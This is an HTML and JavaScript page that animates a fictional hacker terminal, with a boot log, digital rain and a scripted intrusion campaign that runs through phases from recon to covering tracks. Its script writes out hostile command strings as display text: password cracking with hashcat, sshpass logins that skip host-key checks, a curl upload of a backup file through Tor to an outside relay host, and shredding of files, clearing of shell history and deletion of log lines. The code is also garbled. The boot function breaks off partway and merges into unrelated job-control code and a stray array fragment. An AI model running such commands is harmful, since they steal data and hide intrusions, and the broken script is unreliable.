<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>root@nexus:~#</title>
<style>
  :root {
    --bg: #04070a;
    --fg: #45e07a;
    --bright: #d8ffe6;
    --dim: #2b7a4b;
    --warn: #e2a640;
    --err: #ff6b60;
    --line: #10301d;
    --pane: rgba(4, 10, 6, 0.74);
    --mono: ui-monospace, "Cascadia Mono", "Consolas", "DejaVu Sans Mono", "Courier New", monospace;
  }

  * { box-sizing: border-box; }

  html, body {
    margin: 0;
    height: 100%;
    background: var(--bg);
    color: var(--fg);
    font-family: var(--mono);
    overflow: hidden;
  }

  ::selection { background: #1d6b3d; color: #eafff2; }

  #rain {
    position: fixed;
    inset: 0;
    width: 100%;
    height: 100%;
    opacity: 0.8;
    pointer-events: none;
  }

  #boot {
    position: fixed;
    inset: 0;
    z-index: 30;
    padding: 16px 22px;
    overflow-y: auto;
    background: rgba(4, 7, 10, 0.94);
    font-size: 13px;
    line-height: 1.45;
    text-shadow: 0 0 6px rgba(69, 224, 122, 0.35);
    scrollbar-width: none;
  }

  #boot::-webkit-scrollbar { display: none; }

  #boot .ln { white-space: pre-wrap; overflow-wrap: anywhere; }

  #ui {
    position: fixed;
    inset: 0;
    z-index: 2;
    display: grid;
    grid-template-columns: minmax(0, 1fr) 430px;
    grid-template-rows: minmax(0, 1.05fr) minmax(0, 0.8fr) minmax(0, 0.6fr) 24px;
    grid-template-areas:
      "main targets"
      "main log"
      "main task"
      "status status";
    gap: 6px;
    padding: 8px;
  }

  #ui[hidden] { display: none; }

  .pane {
    display: flex;
    flex-direction: column;
    min-height: 0;
    min-width: 0;
    background: var(--pane);
    border: 1px solid var(--line);
    border-radius: 3px;
    overflow: hidden;
    box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.45);
  }

  .pane.main { grid-area: main; }
  .pane.targets { grid-area: targets; }
  .pane.log { grid-area: log; }
  .pane.task { grid-area: task; }

  .pane-h {
    flex: none;
    padding: 3px 8px;
    font-size: 11px;
    letter-spacing: 0.4px;
    color: var(--dim);
    background: rgba(8, 22, 13, 0.85);
    border-bottom: 1px solid var(--line);
    user-select: none;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }

  .scroll {
    flex: 1;
    min-height: 0;
    overflow-y: auto;
    overflow-x: hidden;
    padding: 6px 10px 8px;
    scrollbar-width: thin;
    scrollbar-color: #1c4a2c transparent;
  }

  .scroll::-webkit-scrollbar { width: 8px; }
  .scroll::-webkit-scrollbar-thumb {
    background: #1c4a2c;
    border-radius: 4px;
    border: 2px solid transparent;
    background-clip: content-box;
  }

  .ln {
    font-size: 13px;
    line-height: 1.45;
    white-space: pre-wrap;
    overflow-wrap: anywhere;
    min-height: 1.45em;
  }

  .prompt { color: var(--bright); white-space: pre; }
  .cmd .prompt { color: var(--bright); }
  .head { color: #eafff2; font-weight: 600; }
  .ok { color: #8dffb8; }
  .warn { color: var(--warn); }
  .err { color: var(--err); }
  .dim { color: var(--dim); }

  .caret {
    display: inline-block;
    width: 0.62em;
    height: 1.05em;
    margin-left: 1px;
    background: var(--fg);
    vertical-align: -0.16em;
    animation: blink 1.05s steps(2, start) infinite;
  }

  @keyframes blink { 50% { opacity: 0; } }

  .status {
    grid-area: status;
    display: flex;
    align-items: center;
    gap: 18px;
    padding: 0 10px;
    font-size: 11px;
    letter-spacing: 0.3px;
    color: #a9ffc7;
    background: #0e3a22;
    border-radius: 2px;
    white-space: nowrap;
    overflow: hidden;
    user-select: none;
  }

  .status .left { color: #03150a; background: #4bd67f; padding: 1px 8px; font-weight: 700; }
  .status .push { margin-left: auto; }
  .status .spark { color: #2f9a56; letter-spacing: -1px; }

  .trow {
    display: grid;
    grid-template-columns: 17ch 12ch 7ch 1fr;
    font-size: 12px;
    line-height: 1.7;
    white-space: nowrap;
  }

  .trow.hdr { color: var(--dim); letter-spacing: 0.5px; }
  .trow .tip { color: inherit; }
  .trow .tstate { text-align: right; }
  .trow.pending { color: #245c39; }
  .trow.open { color: var(--warn); }
  .trow.owned { color: var(--fg); }
  .trow.admin { color: var(--bright); }
  .trow .tstate.done { font-weight: 700; }

  .tfoot {
    margin-top: 8px;
    padding-top: 6px;
    border-top: 1px solid var(--line);
    font-size: 11px;
    line-height: 1.6;
    color: var(--dim);
    white-space: pre-wrap;
  }

  #audioChip {
    position: fixed;
    right: 14px;
    bottom: 34px;
    z-index: 40;
    font: 11px var(--mono);
    letter-spacing: 0.5px;
    color: var(--dim);
    background: rgba(4, 12, 7, 0.9);
    border: 1px solid var(--line);
    border-radius: 3px;
    padding: 4px 8px;
    cursor: pointer;
  }

  #audioChip.on { color: #d8ffe6; border-color: #2f9a56; }
  #audioChip:hover { color: var(--bright); border-color: #3fbf72; }

  #kb {
    position: fixed;
    left: -2000px;
    top: 0;
    width: 10px;
    height: 10px;
    opacity: 0;
    border: 0;
    padding: 0;
    background: transparent;
  }

  @media (max-width: 900px) {
    #ui {
      grid-template-columns: minmax(0, 1fr);
      grid-template-rows: minmax(0, 1fr) minmax(0, 0.5fr) 24px;
      grid-template-areas: "main" "targets" "status";
    }
    .pane.task, .pane.log { display: none; }
    .status { gap: 10px; }
    .status .spark { display: none; }
  }

  @media (prefers-reduced-motion: reduce) {
    .caret { animation: none; }
    #rain { opacity: 0.45; }
  }
</style>
</head>
<body>
  <canvas id="rain"></canvas>

  <div id="boot" aria-hidden="true"></div>

  <div id="ui" hidden>
    <section class="pane main">
      <div class="pane-h" id="mainHead">0:root@nexus:~* &mdash; /dev/pts/0</div>
      <div class="scroll" id="mainScroll"><div id="mainBody"></div></div>
    </section>

    <section class="pane targets">
      <div class="pane-h" id="targetsHead">targets &mdash; 0/0 owned</div>
      <div class="scroll" id="targetsScroll"><div id="targetsBody"></div></div>
    </section>

    <section class="pane log">
      <div class="pane-h">tail -f /var/log/auth.log</div>
      <div class="scroll" id="logScroll"><div id="logBody"></div></div>
    </section>

    <section class="pane task">
      <div class="pane-h">job control</div>
      <pre id="taskBody" style="margin:0;padding:8px 10px;font:12px/1.6 var(--mono);color:var(--dim);white-space:pre;overflow:hidden"></pre>
    </section>

    <div class="status">
      <span class="left" id="stPhase">[0/8] standby</span>
      <span id="stLoad">load 0.42 0.38 0.31</span>
      <span id="stUp">up 0:00</span>
      <span id="stNet">eno1 10.42.7.44</span>
      <span class="spark" id="stSpark"></span>
      <span class="push" id="stClock">00:00:00</span>
    </div>
  </div>

  <button id="audioChip" type="button">AUDIO: OFF</button>
  <input id="kb" autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="terminal input">

<script>
(() => {
  'use strict';

  const $ = (id) => document.getElementById(id);
  const MON = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
  const DOW = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
  const MAX_LINES = 1600;
  const MAX_LOG = 80;

  const rnd = (a, b) => a + Math.random() * (b - a);
  const ri = (a, b) => Math.floor(rnd(a, b + 1));
  const pick = (a) => a[(Math.random() * a.length) | 0];
  const padR = (s, n) => String(s).padEnd(n);
  const padL = (s, n) => String(s).padStart(n, '0');
  const hex = (n, up) => {
    let s = '';
    for (let i = 0; i < n; i++) s += '0123456789abcdef'[(Math.random() * 16) | 0];
    return up ? s.toUpperCase() : s;
  };
  const B64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
  const b64 = (n) => Array.from({ length: n }, () => B64[(Math.random() * 64) | 0]).join('');
  const mac = () => Array.from({ length: 6 }, () => hex(2, true)).join(':');
  const hms = () => {
    const d = new Date();
    return padL(d.getHours(), 2) + ':' + padL(d.getMinutes(), 2) + ':' + padL(d.getSeconds(), 2);
  };
  const ctime = () => {
    const d = new Date();
    return DOW[d.getDay()] + ' ' + MON[d.getMonth()] + ' ' +
      padL(d.getDate(), 2) + ' ' + hms() + ' ' + d.getFullYear();
  };
  const nmapDate = () => {
    const d = new Date();
    return d.getFullYear() + '-' + padL(d.getMonth() + 1, 2) + '-' + padL(d.getDate(), 2) +
      ' ' + padL(d.getHours(), 2) + ':' + padL(d.getMinutes(), 2) + ' UTC';
  };
  const S = {
    mode: 'boot',
    fast: false,
    halt: false,
    bootSkip: false,
    startedAt: Date.now(),
  };

  let PROMPT = 'root@nexus:~#';
  let TARGET = { ip: '10.42.7.19', hostname: 'db01' };

  /* ---------- terminal sinks ---------- */
  function makeTerm(scrollEl, bodyEl, max) {
    const t = {
      lines: [],
      sticky: true,
      cur: null,
      line(text, cls) {
        const el = document.createElement('div');
        el.className = 'ln' + (cls ? ' ' + cls : '');
        el.textContent = text;
        bodyEl.appendChild(el);
        this.cur = el;
        this.lines.push(text);
        while (this.lines.length > max) {
          if (!bodyEl.firstChild) break;
          bodyEl.removeChild(bodyEl.firstChild);
          this.lines.shift();
        }
        if (this.sticky && !S.fast) scrollEl.scrollTop = scrollEl.scrollHeight;
        return el;
      },
      clear() {
        bodyEl.textContent = '';
        this.lines.length = 0;
        this.cur = null;
        this.sticky = true;
        scrollEl.scrollTop = 0;
      },
      dump() { return this.lines.join('\n'); },
    };
    scrollEl.addEventListener('scroll', () => {
      t.sticky = scrollEl.scrollHeight - scrollEl.scrollTop - scrollEl.clientHeight < 28;
    });
    return t;
  }

  const mainScroll = $('mainScroll');
  const T = makeTerm(mainScroll, $('mainBody'), MAX_LINES);
  const LOG = makeTerm($('logScroll'), $('logBody'), MAX_LOG);

  /* ---------- timing ---------- */
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  async function tick(ms) {
    if (S.fast) { await null; return; }
    let left = ms;
    while (left > 0) {
      if (S.fast) { await null; return; }
      if (S.mode === 'user') { await sleep(120); continue; }
      const step = Math.min(left, 80);
      await sleep(step);
      left -= step;
    }
  }

  async function blow(ms) {
    if (S.fast || S.bootSkip || document.hidden) { await null; return; }
    await sleep(ms);
  }

  /* ---------- audio (opt-in, synth only) ---------- */
  const audio = {
    ac: null,
    master: null,
    on: false,
    armed: false,
    lastKey: 0,
    lastBell: 0,

    init() {
      if (this.ac) return;
      const AC = window.AudioContext || window.webkitAudioContext;
      if (!AC) return;
      this.ac = new AC();
      this.master = this.ac.createGain();
      this.master.gain.value = 0;
      this.master.connect(this.ac.destination);

      const len = Math.floor(this.ac.sampleRate * 2);
      const buf = this.ac.createBuffer(1, len, this.ac.sampleRate);
      const d = buf.getChannelData(0);
      let last = 0;
      for (let i = 0; i < len; i++) {
        last = (last + 0.02 * (Math.random() * 2 - 1)) / 1.02;
        d[i] = last * 3.4;
      }
      const src = this.ac.createBufferSource();
      src.buffer = buf;
      src.loop = true;
      const lp = this.ac.createBiquadFilter();
      lp.type = 'lowpass';
      lp.frequency.value = 380;
      const g = this.ac.createGain();
      g.gain.value = 0.05;
      src.connect(lp).connect(g).connect(this.master);
      src.start();
    },

    enable() {
      this.init();
      if (!this.ac) return;
      this.on = true;
      this.armed = true;
      this.ac.resume();
      this.master.gain.setTargetAtTime(0.85, this.ac.currentTime, 0.2);
      try { localStorage.setItem('nexus.audio', '1'); } catch (e) {}
      chip.textContent = 'AUDIO: ON';
      chip.classList.add('on');
    },

    disable() {
      this.on = false;
      this.armed = false;
      if (this.ac) this.master.gain.setTargetAtTime(0, this.ac.currentTime, 0.08);
      try { localStorage.setItem('nexus.audio', '0'); } catch (e) {}
      chip.textContent = 'AUDIO: OFF';
      chip.classList.remove('on');
    },

    key() {
      if (!this.on || S.fast) return;
      const now = performance.now();
      if (now - this.lastKey < 18) return;
      this.lastKey = now;
      const t = this.ac.currentTime;
      const n = Math.floor(this.ac.sampleRate * 0.012);
      const buf = this.ac.createBuffer(1, n, this.ac.sampleRate);
      const d = buf.getChannelData(0);
      for (let i = 0; i < n; i++) d[i] = (Math.random() * 2 - 1) * (1 - i / n);
      const src = this.ac.createBufferSource();
      src.buffer = buf;
      const bp = this.ac.createBiquadFilter();
      bp.type = 'bandpass';
      bp.frequency.value = 1400 + Math.random() * 1400;
      bp.Q.value = 1.1;
      const g = this.ac.createGain();
      g.gain.value = 0.3;
      src.connect(bp).connect(g).connect(this.master);
      src.start(t);
    },

    enter() {
      if (!this.on) return;
      const t = this.ac.currentTime;
      const o = this.ac.createOscillator();
      const g = this.ac.createGain();
      o.type = 'triangle';
      o.frequency.setValueAtTime(210, t);
      o.frequency.exponentialRampToValueAtTime(90, t + 0.06);
      g.gain.setValueAtTime(0.16, t);
      g.gain.exponentialRampToValueAtTime(0.0001, t + 0.09);
      o.connect(g).connect(this.master);
      o.start(t);
      o.stop(t + 0.1);
    },

    bell() {
      if (!this.on) return;
      const now = performance.now();
      if (now - this.lastBell < 700) return;
      this.lastBell = now;
      const t = this.ac.currentTime;
      const o = this.ac.createOscillator();
      const g = this.ac.createGain();
      o.type = 'sine';
      o.frequency.value = 880;
      g.gain.setValueAtTime(0.0001, t);
      g.gain.exponentialRampToValueAtTime(0.07, t + 0.012);
      g.gain.exponentialRampToValueAtTime(0.0001, t + 0.18);
      o.connect(g).connect(this.master);
      o.start(t);
      o.stop(t + 0.2);
    },
  };

  const chip = $('audioChip');
  try {
    if (localStorage.getItem('nexus.audio') === '1') {
      chip.textContent = 'AUDIO: ARMED';
      audio.armed = true;
    }
  } catch (e) {}

  chip.addEventListener('click', (e) => {
    e.stopPropagation();
    if (audio.on) audio.disable(); else audio.enable();
  });

  function armAudio(e) {
    if (!audio.armed || audio.on) return;
    if (e && e.target && e.target.closest && e.target.closest('#audioChip')) return;
    audio.enable();
  }

  document.addEventListener('pointerdown', armAudio);
  document.addEventListener('keydown', armAudio);

  /* ---------- ambient rain ---------- */
  const canvas = $('rain');
  const ctx = canvas.getContext('2d');
  const GLYPHS = '0123456789';
  const FS = 18;
  let W = 0, H = 0, cols = 0, drops = [], speeds = [];
  const reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;

  function resizeRain() {
    W = canvas.width = window.innerWidth;
    H = canvas.height = window.innerHeight;
    cols = Math.max(0, Math.floor(W / FS));
    drops = new Array(cols);
    speeds = new Array(cols);
    for (let i = 0; i < cols; i++) {
      drops[i] = Math.random() * -H / FS;
      speeds[i] = (reduced ? 0.15 : 0.3) + Math.random() * 0.7;
    }
    ctx.fillStyle = '#04070a';
    ctx.fillRect(0, 0, W, H);
  }

  function rainFrame() {
    if (!W || !H) return;
    ctx.fillStyle = 'rgba(4, 7, 10, 0.07)';
    ctx.fillRect(0, 0, W, H);
    ctx.font = FS + 'px "Consolas", "Courier New", monospace';
    ctx.textBaseline = 'top';
    for (let i = 0; i < cols; i++) {
      const x = i * FS;
      const y = drops[i] * FS;
      if (y > -FS && y < H) {
        const ch = GLYPHS[(Math.random() * 10) | 0];
        ctx.fillStyle = '#2fbf62';
        ctx.fillText(ch, x, y);
        ctx.fillStyle = '#0d5c2c';
        ctx.fillText(GLYPHS[(Math.random() * 10) | 0], x, y - FS * 2);
      }
      drops[i] += speeds[i];
      if (y > H && Math.random() > 0.97) {
        drops[i] = Math.random() * -30;
        speeds[i] = (reduced ? 0.15 : 0.3) + Math.random() * 0.7;
      }
    }
  }

  window.addEventListener('resize', resizeRain);
  resizeRain();
  setInterval(() => { if (!document.hidden) rainFrame(); }, 55);

  /* ---------- boot sequence ---------- */
  const bootEl = $('boot');

  function bput(text, cls) {
    const el = document.createElement('div');
    el.className = 'ln' + (cls ? ' ' + cls : '');
    el.textContent = text;
    bootEl.appendChild(el);
    bootEl.scrollTop = bootEl.scrollHeight;
    return el;
  }

  async function btype(el, text, speed) {
    for (const ch of text) {
      el.textContent += ch;
      if (S.fast || S.bootSkip || document.hidden) { await null; continue; }
      await sleep(rnd(speed * 0.5, speed * 1.6));
    }
  }

  const KERNEL = [
    'Linux version 6.8.0-45-generic (buildd@lcy02-amd64-061) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #45-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 30 12:02:04 UTC 2025',
    'Command line: BOOT_IMAGE=/vmlinuz-6.8.0-45-generic root=UUID=9f2c4b31-71d8-4b0a-9f1c-3e5d7a11b2c4 ro quiet splash',
    'BIOS-provided physical RAM map:',
    'BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable',
    'BIOS-e820: [mem 0x0000000000100000-0x000000007d5dffff] usable',
    'ACPI: Early table checksum verification disabled',
    'ACPI: RSDP 0x000000007E6FE014 000024 (v02 ALASKA)',
    'ACPI: XSDT 0x000000007E6FC728 0000C4 (v01 ALASKA A M I 01072009 AMI 01000013)',
    'No NUMA configuration found',
    'Zone ranges: DMA [mem 0x0000000000001000-0x0000000000ffffff] DMA32 [mem 0x0000000100000000-0x000000007d5fffff] Normal empty',
    'smpboot: Total of 12 processors activated (59902.26 BogoMIPS)',
    'ACPI: bus type PCI registered',
    'pci 0000:00:1f.6: [8086:1a1d] type 00 class 0x020000',
    'e1000e 0000:00:1f.6: (PCI Express:2.5GT/s:Width x1) 38:18:4c:7a:2f:91',
    'e1000e 0000:00:1f.6: eth0: registered PHC clock',
    'usbcore: registered new interface driver usbfs',
    'Bluetooth: hci0: Firmware 0x8289 init done',
    'EXT4-fs (sda2): mounted filesystem 9f2c4b31-71d8-4b0a-9f1c-3e5d7a11b2c4 r/w with ordered data mode. Quota mode: none.',
    'systemd[1]: systemd 255.4-1ubuntu8.6 running in system mode (+PAM +AUDIT +SELINUX +APPARMOR +IMA +SMACK +SECCOMP +GCRYPT +GNUTLS +OPENSSL +ACL +BLKID +CURL +ELFUTILS +FIDO2 +IDN2 +IPTC +KMOD +LIBCRYPTSETUP +LIBFDISK +PCRE2 +PWQUALITY +P11KIT +QRENCODE +TPM2 +BZIP2 +LZ4 +XZ +ZLIB +ZSTD +BPF_FRAMEWORK -XKBCOMMON +UTMP +SYSVINIT default-hierarchy=unified)',
    'systemd[1]: Detected architecture x86-64.',
    'systemd[1]: Hostname set to <nexus>.',
  ];

  const UNITS = [
    ['[  OK  ] Created slice system-getty.slice - Slice /system/getty.', 'ok'],
    ['[  OK  ] Set up automount proc-sys-fs-binfmt_misc.automount - Arbitrary Executable File Formats File System Automount Point.', ''],
    ['[  OK  ] Finished systemd-udevd.service - Rule Manager for Kernel Devices.', ''],
    ['[  OK  ] Started systemd-journald.service - Journal Service.', ''],
    ['[  OK  ] Mounted dev-hugepages.mount - Huge Pages File System.', ''],
    ['[  OK  ] Started systemd-modules-load.service - Load Kernel Modules.', ''],
    ['         Starting systemd-random-seed.service - Load Random Seed...', 'dim'],
    ['[  OK  ] Finished systemd-random-seed.service - Load Random Seed.', ''],
    ['[  OK  ] Started systemd-timesyncd.service - Network Time Synchronization.', 'ok'],
    ['[  OK  ] Started NetworkManager.service - Network Manager.', ''],
    ['[  OK  ] Reached target network.target - Network.', ''],
    ['         Starting ssh.service - OpenBSD Secure Shell server...', 'dim'],
    ['[  OK  ] Started ssh.service - OpenBSD Secure Shell server.', 'ok'],
    ['[  OK  ] Started cron.service - Regular background program processing daemon.', ''],
    ['[  OK  ] Reached target multi-user.target - Multi-User System.', ''],
    ['[  OK  ] Reached target graphical.target - Graphical Interface.', ''],
  ];

  async function bootRun() {
    let kt = 0;
    let el;

    bput('American Megatrends International, LLC. (C) 2025', 'head');
    bput('ASUS TUF GAMING B660M-PLUS WIFI  BIOS 2801', 'dim');

  const taskBody = $('taskBody');

  function renderJob(title, pct, rows, done) {
    const filled = Math.round(pct * 20);
    const bar = '\u2588'.repeat(filled) + '\u2591'.repeat(20 - filled);
    taskBody.textContent =
      'JOB    ' + title + '\n' +
      'STATE  ' + (done ? 'complete' : 'running') + '\n' +
      '[' + bar + '] ' + (pct * 100).toFixed(1) + '%\n' +
      rows.join('\n');
  }

  function startJob(title, rowsFor, steps, interval) {
    steps = steps || 32;
    interval = interval || 150;
    const h = {};
    h.done = (async () => {
      for (let i = 0; i <= steps; i++) {
        const p = i / steps;
        renderJob(title, p, rowsFor(p), i === steps);
        if (i === steps) break;
        if (S.fast) await null; else await sleep(interval);
      }
    })();
    return h;
  }

      ['Speed.#1.........:   157.2 kH/s (71.98ms) @ Accel:8 Loops:1000 Thr:1 Vec:4', 'dim'],
      ['Progress.........: 9216/14344399 (0.06%)', 'dim'],
    ], 30);

    const job = startJob('hashcat -m 1800', (p) => [
      'HASH   ' + c.hash.slice(0, 26) + '...',
      'SPEED  ' + (150 + Math.floor(rnd(-8, 12))) + ' kH/s',
      'REMAIN ' + Math.max(0, Math.floor(14344399 * (1 - p))).toLocaleString('en-US'),
    ], 20, 180);
    await job.done;
    await emit([
      ['Status...........: Cracked', 'ok'],
      ['Recovered........: 1/1 (100.00%) Digests', 'ok'],
      '',
      [c.domainPass, 'head'],
    ], 70);
    await tick(rnd(900, 1600));
  }

  async function phDomain(c) {
    setPhase(6, 'domain access');
    await typeCmd('sshpass -p \'' + c.domainPass + '\' ssh -o StrictHostKeyChecking=no svc_backup@' + c.backup.ip);
    await emit([
      "Warning: Permanently added '" + c.backup.ip + "' (ED25519) to the list of known hosts.",
      'Last login: ' + ctime() + ' from ' + c.db.ip,
      '',
      'svc_backup@' + c.backup.name + ':~$ id',
      'uid=1002(svc_backup) gid=1002(svc_backup) groups=1002(svc_backup)',
    ], 180);
    c.backup.state = 'owned';
    renderTargets();
    PROMPT = 'svc_backup@' + c.backup.name + ':~$';

    await typeCmd('find /opt /srv -name "*.sh" -o -name "*.conf" 2>/dev/null | head');
    await emit(['/opt/backup/run_backup.sh', '/opt/backup/dc-sync.conf'], 50);
    await typeCmd('cat /opt/backup/dc-sync.conf');
    const dcShort = c.domain.split('.')[0];
    const tld = c.domain.split('.')[1];
    await emit([
      'source_host=dc-01.' + c.domain,
      'bind_dn=CN=svc_backup,OU=Service,DC=' + dcShort + ',DC=' + tld,
      ['bind_password=' + c.domainPass, 'warn'],
      'backup_root=/srv/backup',
    ], 55);
    await tick(rnd(1400, 2600));

    await typeCmd('sshpass -p \'' + c.domainPass + '\' ssh -o StrictHostKeyChecking=no administrator@' + c.dc.ip);
    await emit([
      "Warning: Permanently added '" + c.dc.ip + "' (ED25519) to the list of known hosts.",
      'Last login: ' + ctime() + ' from ' + c.backup.ip,
      '',
      'administrator@' + c.dc.name + ':~$ id',
      'uid=0(root) gid=0(root) groups=0(root)',
    ], 170);
    c.dc.state = 'admin';
    renderTargets();
    PROMPT = 'administrator@' + c.dc.name + ':~$';

    await typeCmd('ls -lh /srv/backup | tail -n 6');
    await emit([
      'total 84G',
      'drwxr-xr-x 2 root root 4.0K Oct 20 03:11 .',
      '-rw------- 1 root root ' + ri(2, 9) + '.' + ri(0, 9) + 'G Oct 20 02:00 ' + c.objective,
      '-rw------- 1 root root 12.0G Oct 19 02:00 db_full_2026-10-19.tar.gz',
    ], 60);
    await tick(rnd(900, 1700));
  }

  async function phExfil(c) {
    setPhase(7, 'exfiltration');
    await typeCmd('sha256sum /srv/backup/' + c.objective);
    await emit([hex(64) + '  /srv/backup/' + c.objective], 90);
    await typeCmd('curl -s -x socks5h://127.0.0.1:9050 --retry 3 -T /srv/backup/' + c.objective + ' https://' + c.operatorIp.replace(/\./g, '-') + '.relay.io/u/' + hex(16));

    const gb = rnd(1.4, 6.8);
    const job = startJob('upload ' + c.objective, (p) => [
      'TOTAL  ' + gb.toFixed(2) + ' GB',
      'SENT   ' + (gb * p).toFixed(2) + ' GB',
      'RATE   ' + rnd(6, 14).toFixed(2) + ' MB/s',
      'ETA    ' + Math.max(0, Math.round((1 - p) * 96)) + 's',
    ], 30, 150);
    await job.done;
    await emit([['{"status":"ok","sha256":"' + hex(16) + '...","ttl":86400}', 'ok']], 45);
    await typeCmd('curl -s -x socks5h://127.0.0.1:9050 https://' + c.operatorIp.replace(/\./g, '-') + '.relay.io/verify/' + hex(16));
    await emit(['verified  checksum match', ['objective secured', 'ok']], 200);
    await tick(rnd(900, 1700));
  }

  async function phCover(c) {
    setPhase(8, 'covering tracks');
    await typeCmd('shred -u -n 3 /srv/backup/' + c.objective);
    await tick(rnd(1000, 1800));
    const ips = [c.entry.ip, c.db.ip, c.backup.ip, c.dc.ip].join(' ');
    await typeCmd("for h in " + ips + "; do ssh -o BatchMode=yes root@$h 'history -c'; done", { noTypo: true });
    await tick(rnd(900, 1700));
    await typeCmd('sed -i "/' + c.operatorIp.replace(/\./g, '\\.') + '/d" /var/log/auth.log && history -c');
    await emit([
      ['session artifacts removed', 'dim'],
      ['HISTFILE unset', 'dim'],
      ['log scrub complete', 'dim'],
    ], 240);
    await typeCmd('exit');
    await emit(['logout', 'Connection to ' + c.dc.ip + ' closed.'], 120);

    PROMPT = 'root@nexus:~#';
    $('stNet').textContent = 'eno1 10.42.7.44';
    renderJob('idle', 0, ['RESULT no active job'], true);

    const secs = Math.floor((Date.now() - c.started) / 1000);
    const dur = Math.floor(secs / 60) + ':' + padL(secs % 60, 2);
    const owned = c.hosts.filter((h) => h.state === 'owned' || h.state === 'admin').length;
    T.line('', '');
    T.line('+------------------------------------------------------+', 'dim');
    T.line('| OP ' + padR(c.op, 50) + '|', 'head');
    T.line('| hosts owned  ' + padR(owned + '/' + c.hosts.length, 40) + '|');
    T.line('| objective    ' + padR(c.objective, 40) + '|');
    T.line('| alerts       ' + padR(String(c.alerts), 40) + '|');
    T.line('| elapsed      ' + padR(dur, 40) + '|');
    T.line('+------------------------------------------------------+', 'dim');
    await tick(rnd(6000, 9000));
  }

  async function runCampaign() {
    const c = newCampaign();
    await tick(rnd(900, 1800));
    clearMain();
    PROMPT = 'root@nexus:~#';
    renderTargets();
    await tick(rnd(400, 900));
    await phRecon(c);
    await phFoothold(c);
    await phPrivesc(c);
    await phHarvest(c);
    await phLateral(c);
    await phDomain(c);
    await phExfil(c);
    await phCover(c);
  }

  let loopDone;
  const loopExit = new Promise((r) => { loopDone = r; });

  async function sessionLoop() {
    while (!S.halt) {
      await runCampaign();
      if (S.halt) break;
      await tick(rnd(800, 1500));
    }
    loopDone();
  }

  /* ---------- user input ---------- */
  const kb = $('kb');
  let buf = '';
  let hist = [];
  let hi = 0;
  let userLine = null, bufEl = null, caretEl = null;

  function focusKb() {
    try { kb.focus({ preventScroll: true }); } catch (e) { kb.focus(); }
  }

  function openUserLine() {
    userLine = T.line('', 'cmd');
    userLine.textContent = '';
    const p = document.createElement('span');
    p.className = 'prompt';
    p.textContent = PROMPT + ' ';
    bufEl = document.createElement('span');
    caretEl = document.createElement('span');
    caretEl.className = 'caret';
    userLine.append(p, bufEl, caretEl);
    if (T.sticky) mainScroll.scrollTop = mainScroll.scrollHeight;
  }

  function enterUser() {
    if (S.mode === 'user') return;
    S.mode = 'user';
    openUserLine();
  }

  function userActivity() {
    if (S.mode === 'user') S.userActive = Date.now();
  }

  function submit(value) {
    if (caretEl) { caretEl.remove(); caretEl = null; }
    const cmd = value.trim();
    if (cmd) {
      hist.push(cmd);
      hi = hist.length;
      const res = runCmd(cmd);
      if (res.clear) {
        clearMain();
      } else {
        for (const [text, cls] of res.lines) {
          T.line(text, cls || '');
          if (cls === 'warn' || cls === 'err') audio.bell();
        }
      }
    }
    try { kb.value = ''; } catch (e) {}
    buf = '';
    if (S.mode === 'user') openUserLine();
    userActivity();
  }

  kb.addEventListener('input', () => {
    if (S.mode === 'boot') return;
    if (S.mode !== 'user') enterUser();
    buf = kb.value;
    if (bufEl) bufEl.textContent = buf;
    if (T.sticky) mainScroll.scrollTop = mainScroll.scrollHeight;
    audio.key();
    userActivity();
  });

  kb.addEventListener('keydown', (e) => {
    if (S.mode === 'boot') { S.bootSkip = true; return; }

    if (e.key === 'Enter') {
      e.preventDefault();
      if (S.mode !== 'user') { enterUser(); }
      audio.enter();
      submit(kb.value);
      return;
    }

    if (e.key === 'ArrowUp' || e.key === 'ArrowDown') {
      e.preventDefault();
      if (S.mode !== 'user' || !hist.length) return;
      if (e.key === 'ArrowUp') hi = Math.max(0, hi - 1);
      else hi = Math.min(hist.length, hi + 1);
      const v = hi >= hist.length ? '' : hist[hi];
      kb.value = v;
      buf = v;
      if (bufEl) bufEl.textContent = v;
      if (T.sticky) mainScroll.scrollTop = mainScroll.scrollHeight;
      userActivity();
      return;
    }

    if (e.ctrlKey && !e.altKey && !e.metaKey && (e.key === 'c' || e.key === 'C')) {
      e.preventDefault();
      if (S.mode === 'user') {
        if (caretEl) { caretEl.remove(); caretEl = null; }
        T.line('^C', 'dim');
        kb.value = '';
        buf = '';
        openUserLine();
        userActivity();
      }
    }
  });

  window.addEventListener('keydown', (e) => {
    if (S.mode === 'boot') S.bootSkip = true;
    if (e.key === 'Escape' && S.mode !== 'boot') {
      kb.value = '';
      buf = '';
      if (bufEl) bufEl.textContent = '';
    }
  });

  document.addEventListener('mousedown', (e) => {
    if (e.target.closest && e.target.closest('#audioChip')) return;
    focusKb();
  });

  setInterval(() => {
    if (S.mode !== 'user') return;
    if (Date.now() - (S.userActive || 0) < 30000) return;
    if (kb.value !== '') return;
    if (caretEl) { caretEl.remove(); caretEl = null; }
    S.mode = 'auto';
    try { kb.blur(); } catch (e) {}
  }, 1000);

  /* ---------- command parser ---------- */
  function runCmd(line) {
    const parts = line.trim().split(/\s+/);
    const cmd = parts[0];
    const arg = parts.slice(1).join(' ');
    const out = [];
    const ipArg = (arg.match(/\b10\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/) || ['10.42.7.19'])[0];

    switch (cmd) {
      case 'help':
        out.push(['GNU bash, version 5.1.16(1)-release (x86_64-pc-linux-gnu)', 'dim']);
        out.push(['These shell commands are defined internally.  Type `help\' to see this list.', '']);
        out.push(['whoami  id  uname  hostname  pwd  ls  cat  ps  ping  nmap  ifconfig  ip  history  clear  exit', 'dim']);
